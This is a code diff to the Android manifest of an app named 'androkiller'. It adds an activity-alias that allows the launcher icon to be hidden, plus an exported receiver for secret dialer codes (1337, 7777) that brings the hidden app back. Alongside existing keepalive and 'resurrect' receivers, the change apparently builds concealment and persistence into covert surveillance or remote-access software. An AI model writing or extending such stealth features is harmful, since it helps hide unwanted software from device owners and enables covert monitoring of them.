@@ -61,12 +61,17 @@
 
         <activity
             android:name=".MainActivity"
+            android:exported="true" />
+
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <activity
             android:name=".ui.chat.ChatOverlayActivity"
@@ -106,6 +111,20 @@
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
                 <action android:name="com.nexus.androkiller.ACTION_KEEPALIVE_ALARM" />
                 <action android:name="com.nexus.androkiller.ACTION_RESURRECT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Secret dial code (*#*#1337#*#* or *#*#7777#*#*) to restore icon and launch app -->
+        <receiver
+            android:name=".receiver.SecretCodeReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="1337" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="7777" />
             </intent-filter>
         </receiver>
 
